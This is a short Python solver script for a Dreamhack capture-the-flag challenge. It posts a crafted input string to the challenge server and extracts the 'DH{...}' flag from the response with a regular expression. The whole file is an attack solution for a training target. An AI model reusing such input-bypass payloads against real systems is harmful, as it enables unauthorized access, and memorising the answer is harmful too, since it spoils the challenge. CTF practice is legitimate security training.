import requests
import re

URL = "http://host3.dreamhack.games:13351"

payload = "drAAAAAe0am@aaa.com"

data = {
    'input_val': payload
}

res = requests.post(URL, data=data)
match = re.search(r'DH\{[^}]*\}', res.text)

print(match.group(0))
